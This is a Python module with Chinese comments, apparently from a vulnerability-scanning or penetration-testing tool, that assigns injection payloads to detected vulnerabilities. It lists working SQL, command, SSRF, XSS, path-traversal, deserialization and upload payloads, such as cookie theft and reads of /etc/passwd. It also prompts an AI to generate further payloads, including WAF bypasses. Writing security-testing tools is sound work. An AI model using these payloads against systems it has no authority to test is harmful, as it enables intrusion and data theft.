"""
Payload 构建器
=============
利用 AI 为每个漏洞自动构造攻击 Payload。

==== 工作流程 ====

1. 输入：漏洞的 Source 点、Sink 点、数据流路径、上下文代码
2. AI 分析漏洞并构造针对性 Payload
3. 输出：结构化的 Payload 列表（含注入点、编码方式、预期效果）

==== Payload 类型 ====

- SQL 注入：    ' OR '1'='1, UNION SELECT, 时间盲注等
- 命令注入：    ; ls, | whoami, $(id), `cmd`
- SSRF：        http://169.254.169.254/, file:///etc/passwd
- XSS：         <script>alert(1)</script>, <img onerror=...>
- 路径穿越：    ../../../etc/passwd, ....//....//
- 反序列化：    O:8:"stdClass":0:{}, POP 链 payload
"""
import json
import re
from dataclasses import dataclass, field


@dataclass
class PayloadSet:
    """
    一组 Payload
    ===========
    """
    vuln_type: str                          # 漏洞类型
    target_file: str                        # 目标文件
    target_line: int                        # 目标行号
    payloads: list["Payload"] = field(default_factory=list)  # 载荷列表
    injection_point: str = ""               # 注入点描述
    encoding_hint: str = ""                 # 编码提示


@dataclass
class Payload:
    """单个攻击 Payload"""
    value: str                              # Payload 值
    method: str = "GET"                     # 注入方法 (GET/POST/HTTP Header)
    param_name: str = ""                    # 参数名
    expected_result: str = ""               # 预期结果
    risk_level: str = "medium"              # 危险等级: safe(探测用) / medium / dangerous
    description: str = ""                   # 中文描述


class PayloadBuilder:
    """
    AI Payload 构建器
    =================
    利用 AI 的代码理解能力为漏洞构造专用 Payload。

    使用流程:
        builder = PayloadBuilder(ai_client)
        payload_sets = builder.build_payloads(vulns, source_code_map)
    """

    # 静态 Payload 模板（作为 AI 生成之前的初始生成）
    STATIC_PAYLOADS = {
        "sql_injection": [
            Payload("' OR '1'='1", param_name="id", expected_result="返回所有记录",
                    risk_level="safe", description="基础布尔盲注探测"),
            Payload("1' UNION SELECT NULL--", param_name="id", expected_result="不报错",
                    risk_level="medium", description="UNION 列数探测"),
            Payload("1' AND SLEEP(5)--", param_name="id", expected_result="响应延迟5秒",
                    risk_level="medium", description="时间盲注探测"),
            Payload("' OR 1=1--", param_name="username", expected_result="绕过认证",
                    risk_level="dangerous", description="认证绕过"),
        ],
        "command_execution": [
            Payload("; id", param_name="cmd", expected_result="返回 uid/gid",
                    risk_level="safe", description="命令执行探测"),
            Payload("| whoami", param_name="host", expected_result="返回用户名",
                    risk_level="medium", description="命令注入 — whoami"),
            Payload("$(uname -a)", param_name="host", expected_result="系统信息",
                    risk_level="medium", description="命令替换注入"),
            Payload("`cat /etc/passwd`", param_name="host", expected_result="passwd 内容",
                    risk_level="dangerous", description="任意文件读取 — 高危"),
        ],
        "ssrf": [
            Payload("http://127.0.0.1:8080", param_name="url", expected_result="内网探测",
                    risk_level="safe", description="本地回环地址探测"),
            Payload("http://169.254.169.254/latest/meta-data/", param_name="url",
                    expected_result="AWS 元数据", risk_level="medium",
                    description="AWS 云元数据探测"),
            Payload("file:///etc/passwd", param_name="url", expected_result="系统文件",
                    risk_level="dangerous", description="本地文件读取（SSRF → LFI）"),
        ],
        "xss": [
            Payload("<script>alert(1)</script>", param_name="name", expected_result="弹窗",
                    risk_level="safe", description="基础 XSS 探测"),
            Payload("<img src=x onerror=alert(1)>", param_name="name", expected_result="弹窗",
                    risk_level="safe", description="img 标签 XSS（绕过某些过滤）"),
            Payload("\"><script>alert(document.cookie)</script>", param_name="name",
                    expected_result="Cookie 泄露", risk_level="medium",
                    description="属性逃逸 + Cookie 窃取"),
        ],
        "path_traversal": [
            Payload("../../../etc/passwd", param_name="file", expected_result="passwd 内容",
                    risk_level="medium", description="Linux 路径穿越 — passwd"),
            Payload("..\\..\\..\\windows\\win.ini", param_name="file",
                    expected_result="Windows 系统文件", risk_level="medium",
                    description="Windows 路径穿越"),
            Payload("....//....//....//etc/passwd", param_name="file",
                    expected_result="绕过过滤", risk_level="medium",
                    description="双写绕过路径穿越"),
        ],
        "deserialization": [
            Payload('O:8:"stdClass":1:{s:4:"test";s:4:"test";}', param_name="data",
                    expected_result="对象被反序列化", risk_level="safe",
                    description="基础反序列化探测"),
        ],
        "file_upload": [
            Payload("shell.php", param_name="filename", expected_result="文件上传成功",
                    risk_level="medium", description="PHP 文件上传探测"),
        ],
    }

    def __init__(self, ai_client):
        """
        初始化 Payload 构建器。

        参数:
            ai_client: AI 客户端实例（用于 AI 辅助生成更精准的 Payload）
        """
        self.ai_client = ai_client

    def build_payloads(self, vulns: list[dict], source_code_map: dict[str, str]) -> list[PayloadSet]:
        """
        为漏洞列表构建 Payload。

        策略：先用静态模板生成基础 Payload，
        如果 AI 已配置则尝试用 AI 生成更精准的 Payload。

        参数:
            vulns:           漏洞列表
            source_code_map: {file_path: source_code} 映射

        返回:
            list[PayloadSet]: 每个漏洞对应的 Payload 组
        """
        payload_sets = []

        for v in vulns:
            vuln_type = v.get("vuln_type", "")
            file_path = v.get("file_path", "")

            ps = PayloadSet(
                vuln_type=vuln_type,
                target_file=file_path,
                target_line=v.get("line_number", v.get("sink_line", 0)),
                injection_point=self._describe_injection_point(v),
            )

            # 1. 静态模板 Payload
            static = self.STATIC_PAYLOADS.get(vuln_type, [])
            ps.payloads.extend(static)

            # 2. AI 增强 Payload（如果可用）
            if self.ai_client and self.ai_client.is_configured():
                ai_payloads = self._ai_enhance_payloads(v, source_code_map)
                for ap in ai_payloads:
                    # 与静态 Payload 去重
                    if not any(p.value == ap.value for p in ps.payloads):
                        ps.payloads.append(ap)

            payload_sets.append(ps)

        return payload_sets

    def _describe_injection_point(self, vuln: dict) -> str:
        """描述注入点"""
        source_func = vuln.get("source_func", "")
        sink_func = vuln.get("sink_func", "")
        data_flow = vuln.get("data_flow", "")

        parts = []
        if source_func:
            parts.append(f"入口: {source_func}")
        if sink_func:
            parts.append(f"危险函数: {sink_func}")
        if data_flow:
            parts.append(f"数据流: {data_flow}")

        return "; ".join(parts) if parts else "未知注入点"

    def _ai_enhance_payloads(self, vuln: dict, source_code_map: dict[str, str]) -> list[Payload]:
        """
        使用 AI 生成针对特定漏洞的增强 Payload。

        AI 能理解上下文代码，生成更有针对性的 Payload。
        """
        if not self.ai_client or not self.ai_client.is_configured():
            return []

        file_path = vuln.get("file_path", "")
        source_code = source_code_map.get(file_path, "")
        vuln_type = vuln.get("vuln_type", "")
        source_code_snippet = vuln.get("source_code", "")
        sink_code_snippet = vuln.get("sink_code", "")

        # 构建 AI Prompt
        prompt = f"""你是一名渗透测试专家。请为以下漏洞生成 3 个攻击 Payload。

漏洞类型: {vuln_type}
源码入口: {source_code_snippet}
危险函数: {sink_code_snippet}
数据流: {vuln.get('data_flow', '')}

请以 JSON 格式回复：
```json
[
  {{
    "value": "payload字符串",
    "expected_result": "预期效果",
    "risk_level": "safe|medium|dangerous",
    "description": "载荷说明"
  }}
]
```

注意：
- safe 级别的 Payload 用于探测，不应有破坏性
- 如果漏洞类型是 SQL 注入，考虑不同数据库（MySQL/PostgreSQL/SQLite）
- 如果存在 WAF 或过滤迹象，考虑绕过技巧
"""
        try:
            response = self.ai_client._chat(prompt)
            # 归一化
            items = response
            if isinstance(items, dict):
                items = [items]
            if isinstance(items, list):
                payloads = []
                for item in items:
                    if isinstance(item, dict) and "value" in item:
                        payloads.append(Payload(
                            value=item["value"],
                            expected_result=item.get("expected_result", ""),
                            risk_level=item.get("risk_level", "medium"),
                            description=item.get("description", ""),
                        ))
                return payloads
        except Exception as e:
            print(f"[PAYLOAD] AI 增强生成失败: {e}")

        return []
